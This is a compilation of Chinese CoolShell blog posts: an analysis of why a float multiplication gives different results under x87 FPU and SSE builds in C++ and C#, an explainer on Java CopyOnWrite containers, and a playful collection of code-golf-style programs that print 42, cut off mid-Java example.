关于Python Decroator的各种提案，可以参看：[Python Decorator Proposals](https://wiki.python.org/moin/PythonDecoratorProposals)

（全文完）

# 一个浮点数跨平台产生的问题

#####  [2014年03月15日 ](https://coolshell.cn/articles/11235.html) [Tanglei.Name](https://coolshell.cn/articles/author/tanglei-name) 评论 [25 条评论](https://coolshell.cn/articles/11235.html#comments) 34,780 人阅读

**感谢网友[唐磊](http://www.tanglei.name/)（微博@[唐磊_name](http://weibo.com/tangleithu?from=feed&loc=nickname)）投稿，本文原文在唐磊的博客上（[原文地址](http://www.tanglei.name/a-bug-relate-with-float-point-between-x86-and-x64-in-csharp/)），原文分析还不够好，而且可能对人有误导，所以，我对原文做了很多修改，并加了Linux下的内容。浮点数是一个很复杂的事情，希望这篇文章有助于大家了解浮点数与其相关的C/C++的编译选项。**（注：我没有Windows 32位以及C#的环境，所以，对于Windows 32位的程序和C#的程序没有验证过）

背景就简单点儿说，最近一个项目C#编写，涉及浮点运算，来龙去脉省去，直接看如下代码。

```
float p3x = 80838.0f;
float p2y = -2499.0f;
double v321 = p3x * p2y;
Console.WriteLine(v321);
```

很简单吧，马上笔算下结果为-202014162，没问题，难道C#没有产生这样的结果？不可能吧，开启Visual Studio，copy代码试试，果然结果是-202014162。就这样完了么？显然没有！你把编译时的选项从AnyCPU改成x64试试~(服务器环境正是64位滴哦！！)结果居然边成了-202014160，对没错，就是-202014160。有点不相信，再跑两遍，仍然是-202014160。呃，想通了，因为浮点运算的误差，-202014160这个结果是合理的。

为什么合理呢？很正常，因为上面的p3x和p2y是两个float类型，虽然v321是double，但也是两个float类型计算完后再转成double的，**float的精度本来也只有7位，所以，对于这个上亿的数，自然没有办法保证精度**。

**但是为什么修改CPU的type会有不同的效果？**嗯，我们再试试C/C++。



```
#include
using namespace std;

int main()
{
    float p3x = 80838.0f;
    float p2y = -2499.0f;
    double v321 = p3x * p2y;
    std::cout.precision(15);
    std::cout << v321 << std::endl;

    return 0;
}
```

上面这段C++代码在不同的平台下的结果如下：

- Windows 32/64位下：-202014160
- Linux 64位下（CentOS 6 gcc 4.4.7）-202014160，
- Linux 32位下（Ubuntu 12.04+ gcc 4.6.3）是：-202014162

**合理的结果应该是-202014160，正确的运算结果是-202014162**，合理性是浮点精度不够造成的（文后解释了合理性）。若是用两个double相乘可得正确且合理的运算结果（注：把上面C++的程序中的p3x和p2y的类型声明成double，就能得到正确的结果，因为double是双精度的，float是单精度，所以double有足够的位数存放更多的数位）。**但是我们有点不明白，为什么Linux 32位下，居然能算出“正确”的数，而不是“合理”的数**。

与C++一样，C#在32位和64位（DEBUG下，这个后面会说）下没有得到一致的结果，那我们来看一下C++/C#的汇编代码（使用gdb的disassemble /m main 命令，另外下面只显示 float * float 然后转成double的那一行代码的汇编）

**Linux平台下用G++编译**

```
//C++ 32位系统下 Ubuntu 12.04
8	    double v321 = p3x * p2y;
   0x0804860f <+27>:	flds   0x18(%esp)
   0x08048613 <+31>:	fmuls  0x1c(%esp)
   0x08048617 <+35>:	fstpl  0x10(%esp)

.......
//C++ 64位系统下 CentOS 6
9           double v321 = p3x * p2y;
   0x000000000040083c <+24>:    movss  -0x20(%rbp),%xmm0
   0x0000000000400841 <+29>:    mulss  -0x1c(%rbp),%xmm0
   0x0000000000400846 <+34>:    unpcklps %xmm0,%xmm0
   0x0000000000400849 <+37>:    cvtps2pd %xmm0,%xmm0
   0x000000000040084c <+40>:    movsd  %xmm0,-0x18(%rbp)
```

**Windows平台下用Visual Studio编译**

```
//C# AnyCPU编译，Windows VS2012
double v321 = p3x * p2y;
00000049  fld         dword ptr [ebp-40h]
0000004c  fmul        dword ptr [ebp-44h]
0000004f  fstp        qword ptr [ebp-4Ch]
//C# X64位编译 Windows7 VS2012
double v321 = p3x * p2y;</pre>
009B43B8 movss xmm0,dword ptr [p3x]
009B43BD mulss xmm0,dword ptr [p2y]
009B43C2 cvtss2sd xmm0,xmm0
009B43C6 movsd mmword ptr [v321],xmm0
```

从上面的汇编代码可以看出，无论是Linux和Windows，C++或C# 32位和64对浮点数的汇编指令并不一样。 32位生成代码用的指令是fld/fmul/fstp等，而64位下的使用了movss/mulss/movsd/的指令。看下来，似乎这个事情和平台有关系。

我们继续调查，我们发现，其中fld/fmul/fstp等指令是由**FPU**(float point unit)浮点运算处理器做的，准确的说，是FPU x87指令，FPU在进行浮点运算时，用了**80位**的寄存器做相关浮点运算，然后再根据是float/double截取成32位或64位，FPU默认上会尽量减少由于需要四舍五入带来的精度问题。可参看浮点运算标准[IEEE-754](https://en.wikipedia.org/wiki/IEEE_floating_point) 推荐标准实现者提供浮点可扩展精度格式([Extended precision](https://en.wikipedia.org/wiki/Extended_precision))，Intel x86处理器有FPU(float point unit)浮点运算处理器支持这种扩展。

非FPU的情况是用了SSE中128位寄存器(float实际只用了其中的32位，计算时也是以32位计算的)，这就是导致上述问题产生的最终原因。详细分析见文末说明。

知道了这一点，我们可以man g++ 看一下文档，我们可以找到一个编译选项叫：**-mfpmath，在32位下，这个编译选项的默认值是：387，也就是x87 FPU指令，在64位下，这个编译选项的值是sse，也就是使用SSE的指令**。所以，就这篇文章中的这个例子而言，如果你在64bits下加上如 -mfpmath=387，你会得到“正确的”结果，而不是“合理的”结果。

而在VS2012中C++，[编译选项可以设置(代码生成中)](http://msdn.microsoft.com/zh-cn/library/vstudio/e7s85ffb(v=vs.110).aspx)可选，/fp:[precise | fast | strict]，本例中Release 32位下用precise 或者 strict将得到合理的结果(-202014160)，fast将产生正确的结果(-202014162), fast debug/release下结果也不一样哦(release下才优化了)。64系统下各个结果可以大家自己去测试下(Debug/Release)，分别看看VS编译后产生的中间代码长什么样。（陈皓注：我的VS2012在debug编译下，无论你怎么设置/fp的参数值，汇编都是一样的，使用SSE指令，而Release就不一样了，但是我的release下看代码的汇编非常怪异和源代码对上号，多年不用Windows开发了，对VS的使用仅停留在VC6++/VC2005上）

所以，我们在从x87 FPU指令向SSE指令做代码移植的时候，我们可能会遇到向这样的浮点数的精度问题，这个精度问题会多次科学计算中会更糟糕。**这个问题并不简单的只是在32位和64位中的系统出算，这个问题主要还是看语言编译器的实现**。在更为高级的语言中，如：C99或Fortran 2003中，引入了“long double”来做可扩展双精度（Extension Double），这样就可以消除更多的精度问题。

下面我们把程序改成long double，（注：其中的类型变成long double）

```
#include
using namespace std;

int main()
{
    long double p3x = 80838.0;
    long double p2y = -2499.0;
    long double v321 = p3x * p2y;
    std::cout.precision(15);
    std::cout << v321 << std::endl;

    return 0;
}
```

用gdb的disassemble /m main你会看到其中的运算的汇编如下（使用了fmlp指令）：

```
//linux 32位系统
8	    long double v321 = p3x * p2y;
   0x08048633 <+63>:	fldt   0x10(%esp)
   0x08048637 <+67>:	fldt   0x20(%esp)
   0x0804863b <+71>:	fmulp  %st,%st(1)
   0x0804863d <+73>:	fstpt  0x30(%esp)
//linux 64位系统
8           long double v321 = p3x * p2y;
   0x0000000000400818 <+52>:    fldt   -0x30(%rbp)
   0x000000000040081b <+55>:    fldt   -0x20(%rbp)
   0x000000000040081e <+58>:    fmulp  %st,%st(1)
   0x0000000000400820 <+60>:    fstpt  -0x10(%rbp)
```

我们可以看到，32位系统和64位系统使用了同样的汇编指令（当然，我没有那么多物理机，我只是在VMWare Play的虚拟机上测试的，所以上面的示例并不一定适用于所有的地方，另外，C/C++语言和编译器和平台有非常大的关系） ，原因自然是我们用到了long double这个扩展双精度的数据类型。（注：如果你用double或float，在Linux上，32位用x87 FPU 指令编译，而64位用SSE指令编译）

好了，我们再回到C#上来，C#的浮点是支持该标准的，其中[其官方文档](http://msdn.microsoft.com/en-us/library/aa691146(v=vs.71).aspx)也提到了浮点运算可能会产生比返回类型更高精度的值（正如上面的返回值精度就超过了float的精度），并说明如果硬件支持可扩展浮点精度的话，那么**所有的**浮点运算都将用此精度进行以提高效率，举个例子x*y/z, x*y的值可能都在double的能力范围之外了，但真实情况可能除以z后又能把结果拉回到double范围内，这样的话，用了FPU的结果就会得到一个准确的double值，而非FPU的就是无穷大之类的了。

所以，对于C#来说，你显然无法找到一个像C/C++一样的利用编译器选项的来解决这个问题的“解决方案”（其实，用编译器参数是一个伪解决方案）。

**而且，要解决这个问题也不是要修改编译器选项，因为这个问题明显不是FPU或是SSE的问题，FPU是个过时的技术，SSE才是合理的技术，所以，如果你不想你的浮点数在计算上有什么问题，而且你需要精度准确，正确的解决方案不是搞编译参数，而是——你一定要使用精度更高字节数更多的数据类型，比如：double 或是long double。**

另外，大家在写代码的时候得保证实际运行环境/测试环境/开发环境的**一致性(包括OS架构啊、编译选项等)**啊（**尤其是C/C++ 而且，编译器上的参数可能会有很多坑，而且有些坑可能会掩盖你程序中的问题**），不然莫名其妙的问题会产生（本文就是开发环境与运行环境不一致导致的问题，纠结了好久才发现是这个原因）；遇到涉及浮点运算的时候别忘了有可能是这个原因产生的；**float/double混用的情况得特别注意**。

**Reference：**

[1] [C# Language Specification Floating point types](http://msdn.microsoft.com/en-us/library/aa691146(v=vs.71).aspx)
[2] [Are floating-point numbers consistent in C#? Can they be?](http://stackoverflow.com/questions/6683059/are-floating-point-numbers-consistent-in-c-can-they-be)
[3] [The FPU Instruction Set](http://www.plantation-productions.com/Webster/www.artofasm.com/Linux/HTML/RealArithmetica2.html)

#### **附录**

##### **80838.0f \* -2499.0f = -202014160.0浮点运算过程的说明**

32位浮点数在计算机中的表示方式为：1位符号位(s)-8位指数位(E)-23位有效数字(M)。
32位Float = (-1)^s * (1+m) * 2^(e-127), 其中e是实际转换成1.xxxxx*2^e的指数,m是前面的xxxxx(节约1位)

80838.0f = 1 0011 1011 1100 0110.0= 1.00111011110001100*2^16
有效位M = 0011 1011 1100 0110 0000 000
指数位E = 16 + 127 = 143 = 10001111
内部表示 80838.0 = 0 [1000 1111] [0011 1011 1100 0110 0000 000]
= 0100 0111 1001 1101 1110 0011 0000 0000
= 47 9d e3 00 //实际调试时看到的内存值 可能是00 e3 9d 47是因为调试环境用了小端表示法法：低位字节排内存低地址端，高位排内存高地址

-2499.0 = -100111000011.0 = -1.001110000110 * 2^11
有效位M = 0011 1000 0110 0000 0000 000
指数位E = 11+127=138= 10001010
符号位s = 1
内部表示-2499.0 = 1 [10001010] [0011 1000 0110 0000 0000 000]
=1100 0101 0001 1100 0011 0000 0000 0000
=c5 1c 30 00

80838.0 * -2499.0 = ?

首先是指数 e = 11+16 = 27
指数位E = e + 127 = 154 = 10011010
有效位相乘结果为 1.1000 0001 0100 1111 1011 1010 01 //可以自己动手实际算下
实际中只能有23位，后面的被截断即1000 0001 0100 1111 1011 1010 01
相乘结果内部表示=1[10011010][1000 0001 0100 1111 1011 101]
= 1100 1101 0100 0000 1010 0111 1101 1101
= cd 40 a7 dd

结果 = -1.1000 0001 0100 1111 1011 101 *2^27
= -11000 0001 0100 1111 1011 1010000
= -202014160
再转成double后还是-202014160.

如果是FPU的话，上面的有效位结果不会被截断，即
FPU结果 = -1.1000 0001 0100 1111 1011 101**001** *2^27
= -11000 0001 0100 1111 1011 101**001**0
= -202014162

全文完，若本文有纰漏之处欢迎指正。

# JAVA中的COPYONWRITE容器

#####  [2014年03月07日 ](https://coolshell.cn/articles/11175.html) [方 腾飞](https://coolshell.cn/articles/author/kiral) 评论 [38 条评论](https://coolshell.cn/articles/11175.html#comments) 45,309 人阅读

![img](photo/cow-copy-300x222.jpg)**感谢 [清英](http://ifeve.com/) 同学的投稿**

Copy-On-Write简称COW，是一种用于程序设计中的优化策略。其基本思路是，从一开始大家都在共享同一个内容，当某个人想要修改这个内容的时候，才会真正把内容Copy出去形成一个新的内容然后再改，这是一种延时懒惰策略。从JDK1.5开始Java并发包里提供了两个使用CopyOnWrite机制实现的并发容器,它们是CopyOnWriteArrayList和CopyOnWriteArraySet。CopyOnWrite容器非常有用，可以在非常多的并发场景中使用到。

目录



[什么是CopyOnWrite容器](https://coolshell.cn/articles/11175.html#什么是CopyOnWrite容器)[CopyOnWriteArrayList的实现原理](https://coolshell.cn/articles/11175.html#CopyOnWriteArrayList的实现原理)[CopyOnWrite的应用场景](https://coolshell.cn/articles/11175.html#CopyOnWrite的应用场景)[CopyOnWrite的缺点](https://coolshell.cn/articles/11175.html#CopyOnWrite的缺点)

#### 什么是CopyOnWrite容器

CopyOnWrite容器即写时复制的容器。通俗的理解是当我们往一个容器添加元素的时候，不直接往当前容器添加，而是先将当前容器进行Copy，复制出一个新的容器，然后新的容器里添加元素，添加完元素之后，再将原容器的引用指向新的容器。这样做的好处是我们可以对CopyOnWrite容器进行并发的读，而不需要加锁，因为当前容器不会添加任何元素。所以CopyOnWrite容器也是一种读写分离的思想，读和写不同的容器。



#### CopyOnWriteArrayList的实现原理

在使用CopyOnWriteArrayList之前，我们先阅读其源码了解下它是如何实现的。以下代码是向ArrayList里添加元素，可以发现在添加的时候是需要加锁的，否则多线程写的时候会Copy出N个副本出来。

```
public boolean add(T e) {
    final ReentrantLock lock = this.lock;
    lock.lock();
    try {

        Object[] elements = getArray();

        int len = elements.length;
        // 复制出新数组

        Object[] newElements = Arrays.copyOf(elements, len + 1);
        // 把新元素添加到新数组里

        newElements[len] = e;
        // 把原数组引用指向新数组

        setArray(newElements);

        return true;

    } finally {

        lock.unlock();

    }

}

final void setArray(Object[] a) {
    array = a;
}
```

读的时候不需要加锁，如果读的时候有多个线程正在向ArrayList添加数据，读还是会读到旧的数据，因为写的时候不会锁住旧的ArrayList。

```
public E get(int index) {
    return get(getArray(), index);
}
```

JDK中并没有提供CopyOnWriteMap，我们可以参考CopyOnWriteArrayList来实现一个，基本代码如下：

```
import java.util.Collection;
import java.util.Map;
import java.util.Set;

public class CopyOnWriteMap<K, V> implements Map<K, V>, Cloneable {
    private volatile Map<K, V> internalMap;

    public CopyOnWriteMap() {
        internalMap = new HashMap<K, V>();
    }

    public V put(K key, V value) {

        synchronized (this) {
            Map<K, V> newMap = new HashMap<K, V>(internalMap);
            V val = newMap.put(key, value);
            internalMap = newMap;
            return val;
        }
    }

    public V get(Object key) {
        return internalMap.get(key);
    }

    public void putAll(Map<? extends K, ? extends V> newData) {
        synchronized (this) {
            Map<K, V> newMap = new HashMap<K, V>(internalMap);
            newMap.putAll(newData);
            internalMap = newMap;
        }
    }
}
```

实现很简单，只要了解了CopyOnWrite机制，我们可以实现各种CopyOnWrite容器，并且在不同的应用场景中使用。

#### CopyOnWrite的应用场景

CopyOnWrite并发容器用于读多写少的并发场景。比如白名单，黑名单，商品类目的访问和更新场景，假如我们有一个搜索网站，用户在这个网站的搜索框中，输入关键字搜索内容，但是某些关键字不允许被搜索。这些不能被搜索的关键字会被放在一个黑名单当中，黑名单每天晚上更新一次。当用户搜索时，会检查当前关键字在不在黑名单当中，如果在，则提示不能搜索。实现代码如下：

```
package com.ifeve.book;

import java.util.Map;

import com.ifeve.book.forkjoin.CopyOnWriteMap;

/**
 * 黑名单服务
 *
 * @author fangtengfei
 *
 */
public class BlackListServiceImpl {

    private static CopyOnWriteMap<String, Boolean> blackListMap = new CopyOnWriteMap<String, Boolean>(
            1000);

    public static boolean isBlackList(String id) {
        return blackListMap.get(id) == null ? false : true;
    }

    public static void addBlackList(String id) {
        blackListMap.put(id, Boolean.TRUE);
    }

    /**
     * 批量添加黑名单
     *
     * @param ids
     */
    public static void addBlackList(Map<String,Boolean> ids) {
        blackListMap.putAll(ids);
    }

}
```

代码很简单，但是使用CopyOnWriteMap需要注意两件事情：

1. 减少扩容开销。根据实际需要，初始化CopyOnWriteMap的大小，避免写时CopyOnWriteMap扩容的开销。
2. 使用批量添加。因为每次添加，容器每次都会进行复制，所以减少添加次数，可以减少容器的复制次数。如使用上面代码里的addBlackList方法。

#### CopyOnWrite的缺点

CopyOnWrite容器有很多优点，但是同时也存在两个问题，即内存占用问题和数据一致性问题。所以在开发的时候需要注意一下。

**内存占用问题**。因为CopyOnWrite的写时复制机制，所以在进行写操作的时候，内存里会同时驻扎两个对象的内存，旧的对象和新写入的对象（注意:在复制的时候只是复制容器里的引用，只是在写的时候会创建新对象添加到新容器里，而旧容器的对象还在使用，所以有两份对象内存）。如果这些对象占用的内存比较大，比如说200M左右，那么再写入100M数据进去，内存就会占用300M，那么这个时候很有可能造成频繁的Yong GC和Full GC。之前我们系统中使用了一个服务由于每晚使用CopyOnWrite机制更新大对象，造成了每晚15秒的Full GC，应用响应时间也随之变长。

针对内存占用问题，可以通过压缩容器中的元素的方法来减少大对象的内存消耗，比如，如果元素全是10进制的数字，可以考虑把它压缩成36进制或64进制。或者不使用CopyOnWrite容器，而使用其他的并发容器，如[ConcurrentHashMap](http://ifeve.com/concurrenthashmap/)。

**数据一致性问题**。CopyOnWrite容器只能保证数据的最终一致性，不能保证数据的实时一致性。所以如果你希望写入的的数据，马上能读到，请不要使用CopyOnWrite容器。

关于C++的STL中，曾经也有过Copy-On-Write的玩法，参见陈皓的《[C++ STL String类中的Copy-On-Write](http://blog.csdn.net/haoel/article/details/24058)》，后来，因为有很多线程安全上的事，就被去掉了。

（全文完）

# 如何用最有创造力的方式输出42

#####  [2014年03月06日 ](https://coolshell.cn/articles/11170.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [29 条评论](https://coolshell.cn/articles/11170.html#comments) 42,962 人阅读

![img](photo/42-300x240.jpg)酷壳似乎好长时间没有像《[编程真难啊](https://coolshell.cn/articles/1391.html)》或是《[老手是这样教新手编程的](https://coolshell.cn/articles/2420.html)》或是像《[如何写出无法维护的代码](https://coolshell.cn/articles/4758.html)》这样“严肃正经”的文章了，所以，赶在大家还没有向我扔臭鸡蛋前奉献一篇。这篇文章来自CodeGolf.StackExchange上的《[Most creative way to display 42](http://codegolf.stackexchange.com/questions/21835/most-creative-way-to-display-42)》—— 请以最有创造力的方式输出42。于是出现了下面的这些答案（注：精彩的总是留在最后面）

目录



[人生和宇宙终级问题的答案：42](https://coolshell.cn/articles/11170.html#人生和宇宙终级问题的答案：42)[Ruby](https://coolshell.cn/articles/11170.html#Ruby)[Javascript](https://coolshell.cn/articles/11170.html#Javascript)[Shell](https://coolshell.cn/articles/11170.html#Shell)[Python](https://coolshell.cn/articles/11170.html#Python)[Java](https://coolshell.cn/articles/11170.html#Java)[C/C++](https://coolshell.cn/articles/11170.html#CC)[Brainfuck](https://coolshell.cn/articles/11170.html#Brainfuck)

#### 人生和宇宙终级问题的答案：42

这里，需要介绍一下为什么要输出42。这时因为42是我们人生，世界乃至整个宇宙的终级答案。这要从《银河系漫游指南》（英文名：The Hitchhiker’s Guide to the Galaxy）说起。这本书是著名英国科幻小说作家Douglas  Adams所著5本银河系漫游指南系列科幻喜剧系列小说中的第一本，改编自他本人为英国广播公司第四电台（BBC Radio 4）所写的广播剧剧本。该书1979年10月12日首次由麦克米伦出版公司（Pan Books）出版，次周成为英国图书销量榜冠军，前3个月内销售超过25万本。截至2005年，这本小说已被翻译成超过30种语言在全世界发行，并且被改编为电视剧、电影、舞台剧等多种艺术形式的作品。

这本小说中小说中充满尖锐的讽刺和隐喻，被西方科幻爱好者奉为“科幻圣经”。其中有两个关键词，一个是Don’t Panic，一个是42影响力很大，而其中关于42的故事简介是这样的：

百万年前，老鼠其实是一种超智慧生物，它们建造了一部超级电脑深思Deep Thought，它们问超级电脑，生命、宇宙以及任何事情的终极答案（*Answer to Life, the Universe, and Everything*）什么，经过了750万年的计算，深思告诉老鼠的后人答案是**42**，深思解释它只能计算出答案是什么，但答案的原因必须由另一部更高智能的电脑才能解释，而该部电脑就是地球。经过了800万年，就在结果要出来的五分钟前，地球却因为挡在预定兴建的星际间高速公路的路线，被Vogons给毁灭，电脑没有给出最后的结果。



故事里面还说了这个42是6 乘于 9得来。当然，6乘9应该是54，但是因为地球上的电脑被搞坏了，导致主人翁答错了。至于后来有人说6 x 9 = 42是基于13进制，原作者说，完全没有这回事，他就是瞎搞的。

网上有很多人在猜测42的含义，比如[douban的这篇文章](http://www.douban.com/note/232036705/)，但是原作者出来说这他就是随机想了一个，完全没有任何意义。

对于42来说，数字42和短语，“生命，宇宙以及一切的答案”（*Answer to Life, the Universe, and Everything*） 已达到在互联网上邪教的地位。在各种技术宅，极客，科学圈有着非同凡响的地位。

- 您若在Google输入[the answer to life, the universe, and everything](https://www.google.com/search?q=the+answer+to+life%2C+the+universe%2C+and+everything)，Google会直接回答42——而且还是用Google计算器算出来的。
- 若在[Wolfram Alpha](https://zh.wikipedia.org/wiki/Wolfram_Alpha)中输入[Answer to the Ultimate Question of Life, the Universe, and Everything](http://www.wolframalpha.com/input/?i=Answer+to+the+Ultimate+Question+of+Life%2C+the+Universe%2C+and+Everything)，Wolfram Alpha也会回答42
- 若在iPhone/iPad的Siri中问[What’s the meaning of life?]，Siri也会回答42
- 在[OpenOffice.org](https://en.wikipedia.org/wiki/OpenOffice.org)软件，如果您在任何单元格输入spreadsheet=ANTWORT(“Das Leben, das Universum und der ganze Rest”) (注：德语的ANSWER(“life, the universe and everything”))，结果也会是42。

另外，在美剧《Lost》里那个经典的数字序列： 4, 8, 15, 16, 23,42。经Lost的导演确认，最后那个42也是源自《银河系漫游指南》

好了，言归正传，下面让我们来看一下如何输出42的。

#### Ruby

``puts (6 * 9).to_s(13)[/h4]

解释：6 x 9 = 42的表达式（基于13进制）

#### Javascript

[javascript]String.prototype.answer = function() {
alert(this.charCodeAt(+!"The End of the Universe"));
};
‘*’.answer();[/javascript]

解释：+!”The End of the Universe”的值是0，’*’的ASCII码是42

[javascript]console.log("Douglas Adams".length + "born on".length +
[1,1,0,3,1,9,5,2].reduce(
function(previousValue, currentValue, index, array){
return previousValue + currentValue;
}
)
);

/* [1,1,0,3,1,9,5,2] => March 11, 1952 */[/javascript]

解释：Douglas Adams 是一位英国广播剧作家、和音乐家，尤其以《银河系漫游指南》系列作品出名。这部作品以广播剧起家，后来发展成包括五本书的“三部曲”，拍成电视连续剧。亚当斯逝世后还拍成电影。 除《银河系漫游指南》系列外亚当斯还参加了科幻电视连续剧《神秘博士》的拍摄工作，他写了其中的一些剧本。也的生日是 1952 年 3 月 11 日。

[javascript]alert((!![]+ -~[])*(!![]+ -~[])+""+(!![]+ -~[]))[/javascript]

解释：[]是个空，![]就是true，~[]是-1, 于是，表达式就这样出来了。变态！

[javascript]var ________ = 0.023809523809523808, ____ = 1, ___ = 0, __ = 0, _ = 1;

__ – ___
/_ |0 // \\
/_/ 0 // \\
/_/_ |0 //
/_/_ |0 //
/_/____ |_ //
/________|0 //
|0 //______________[/javascript]

解释：这个其实是代码混乱的技巧之一，用下划线当变量。你可以参考《[如何加密/混乱C源代码](https://coolshell.cn/articles/933.html)》和《[6个变态的C语言Hello World程序](https://coolshell.cn/articles/914.html)》

#### Shell

```
echo "what is the universe"|tr "a-z " 0-7-0-729|sed 's/9.//g;s/-/+/'|bc
```

解释：其中，bc是一个计算器。tr是一个字符转换的命令，比如：`echo "good" | tr "good" "test"`输出 `tsst`。也就是说，g-t, o-e, o-s, d-t的映射，o被映了两次，所以，第二次会覆盖第一次。对于上面的`tr "a-z " 0-7-0-7-729`的意思是：abcdefg分别对应01234567，h对应-，ijklmno对应01234567，p对于2，剩下的包括空格都是9。如果你对tr和sed和bc不熟悉的话，可以man一下，关于sed你可以看一下我的《[sed简明教程](https://coolshell.cn/articles/9104.html)》

```
#!/bin/bash

#Vertical Version
echo $((2#100))
echo $((2#10))

#Horizontal Version
echo $((2#000100))$((2#00010))
```

解释：2#100的意思就是说，#左边的数说明是“2进制”，右边的数是二进制数“100”，如16#ff就是16进制的ff，也就是十进制的255

```
echo "obase=13;6*9"|bc|figlet
```

上面的命令输出：

```
 _  _  ____
| || ||___ \
| || |_ __) |
|__   _/ __/
   |_||_____|
```

解释：为了使用figlet命令，你还要去安装一个figlet（http://www.figlet.org/）这是一个让你画ASCII图的命令。

#### Python

Windows下，给你画个图：

```
import win32api, win32con, win32gui
from time import time, sleep
import os

w = { 1:[(358, 263), (358, 262), (358, 261), (359, 261), (359, 262), (359, 264), (359, 266), (359, 270), (359, 282),
     (358, 289), (357, 308), (356, 319), (355, 341), (355, 351), (355, 360), (355, 378), (355, 388), (354, 397),
     (354, 406), (354, 422), (354, 428), (354, 436), (354, 438), (354, 439), (354, 440), (355, 440), (356, 439),
     (357, 439), (358, 438), (360, 438), (362, 437), (369, 437), (372, 437), (381, 437), (386, 437), (391, 437),
     (397, 436), (411, 436), (419, 435), (434, 435), (442, 435), (449, 434), (456, 434), (468, 434), (473, 435),
     (480, 436), (483, 436), (485, 436), (487, 437), (488, 437), (488, 438), (488, 439), (487, 440), (486, 440),
     (485, 440), (484, 440), (483, 439), (483, 437), (481, 431), (481, 427), (481, 420), (481, 413), (483, 396),
     (485, 387), (488, 367), (491, 356), (493, 345), (500, 321), (503, 310), (507, 299), (514, 280), (517, 272),
     (520, 266), (523, 260), (524, 258), (524, 259), (524, 261), (524, 265), (524, 269), (523, 275), (522, 289),
     (521, 297), (518, 315), (516, 324), (515, 334), (513, 345), (509, 368), (507, 382), (502, 411), (500, 426),
     (498, 440), (495, 453), (491, 478), (489, 491), (485, 517), (483, 530), (481, 542), (479, 552), (476, 570),
     (475, 577), (474, 588), (473, 592), (473, 595), (473, 597), (473, 600), (473, 601), (473, 602), (473, 601),
     (474, 599), (475, 597), (476, 594), (478, 587)],
  2:[(632, 305), (634, 306), (636, 309), (639, 314), (641, 319), (645, 330), (647, 337), (649, 353), (649, 362),
     (649, 372), (649, 384), (645, 409), (639, 436), (636, 448), (632, 459), (627, 470), (623, 479), (613, 497),
     (608, 503), (599, 512), (595, 514), (591, 514), (587, 513), (581, 504), (578, 498), (576, 483), (575, 476),
     (575, 469), (579, 454), (582, 447), (591, 436), (595, 432), (600, 430), (605, 429), (617, 432), (624, 437),
     (639, 448), (646, 455), (654, 461), (662, 469), (679, 484), (686, 491), (702, 504), (710, 509), (718, 512),
     (727, 514), (744, 515), (752, 515), (767, 512), (774, 510), (779, 508), (783, 505), (788, 499), (789, 495),
     (789, 486)] }

def d( x1, y1, x2, y2 ):
    win32api.SetCursorPos((x1, y1))
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
    win32api.SetCursorPos((x2, y2))
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
    sleep(0.01)

def p( l1 ):
    l2 = [""]
    l2.extend(l1)
    l1.append("")
    l3 = zip(l2, l1)
    l3.pop(0)
    l3.pop(-1)
    for n in l3:
        d(n[0][0], n[0][1], n[1][0], n[1][2])

os.startfile("C:\Windows\system32\mspaint.exe")
sleep(0.5)
win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_MAXIMIZE)
sleep(0.5)

for n in w:
    p(w[n])
```

输出：![img](photo/1j0va.png)

lambda表达式

```
>>> p = lambda x: x%2!=0 and True<>> sum(p(i) for i in range(0,6))
```

解释：对python的lambda表达式或函数式编程不是很清楚的同学可以看一下《[函数式编程](https://coolshell.cn/articles/10822.html)》

#### Java

```
import java.lang.*;
class answer_to_everything 
{
    void static main() 
    {
        String s = "Hitchhiker's Guide to the Galaxy";
        String s2 = "Don'tPanic";
        String s3 = "The Restaurant at the End of the Universe.";

        int arthur_dent = s.length();
        int ford_prefect = s2.length();
        int zooey_deschanel = s3.length();
        int vogon_poetry = arthur_dent + ford_prefect;

        System.out.println("         " + vogon_poetry + "       " + zooey_deschanel + " " + zooey_deschanel); //in case you're confused, I'm using Zooey to print the big '2', and Vogons to print the big '4'.
        System.out.println("       " + vogon_poetry + vogon_poetry + "     " + zooey_deschanel + "     " + zooey_deschanel);
        System.out.println("     " + vogon_poetry + "  " + vogon_poetry + "    " + zooey_deschanel + "       " + zooey_deschanel);
        System.out.println("   " + vogon_poetry + "    " + vogon_poetry + "            " + zooey_deschanel);
        System.out.println(" " + vogon_poetry + "      " + vogon_poetry + "          " + zooey_deschanel);
        System.out.println(vogon_poetry + " " + vogon_poetry + " " + vogon_poetry + " DA " + vogon_poetry + "     " + zooey_deschanel);
        System.out.println("         " + vogon_poetry + "     " + zooey_deschanel);
        System.out.println("         " + vogon_poetry + "    " + zooey_deschanel + " " + zooey_deschanel + " " + zooey_deschanel + " " + zooey_deschanel);
    }
}
```

上面这段看上去平淡无奇，但其亮点是那三个string，这段代码输出：

```
         42       42 42
       4242     42     42
     42  42    42       42
   42    42            42
 42      42          42
42 42 42 DA 42     42
         42     42
         42    42 42 42 42
```

别忘了Java也可以混乱代码：

```
public        class         FourtyTwo{ public
static         void         main(String[]args)
{  new        javax                    .swing.
JFrame        () {{                    setSize
(42 /(        42/42                    +42/42)
*42/ (        42/42                    +42/42)
,42/(42/ 42+42/42)*         42/(42/42+42/42));
}public void paint(         java.awt .Graphics
  g){g.drawPolygon(         new int[]{42,42,42
              + 42+         42,42+
              42+42         ,42+42
              +42 +         42,42+
              42+42         +42,42
              + 42+         42,42+42+42,42+42,
              42+42         },new int[]{42,42+
              42+42         +42,42+42+42+42,42

+42+42+42+42+42,                  42+42+
42+42+42+42,42,42,               42+42+42
,42 +        42+42              ,42}, (42/
42+42        /42)*              (42/  42 +
42/42        + 42/             42 +    42 /
42+42        /42))            ;g.drawPolygon
( new        int[]           {42+42+42+42+42,
42+42        +42 +           42+42      , 42+
42+42        + 42+          42+42        + 42,
42+42        +42 +          42+42        +42 +
42,42+42+42+42+42,         42+42          + 42+
42+42,42+ 42+42+           42+42          +42 +

42+42,42+42+42+42+42+42+42+42,42+42+42+42+42+42,
42+42+42+42+42+42,42+42+42+42+42+42+42+42,42+42+
42+42+42+42+42+42},new int[]{42,42 +42,42+42,42+
42+42,42+42+42,42+42+42+42+42+42,42+42+42+42+42+
42,42+42+42+42+42,42+42+42+42+42,42+42+42+42,42+
42+42+42,42},(42/42+42/42+42/42)*((42/42+42/42)*
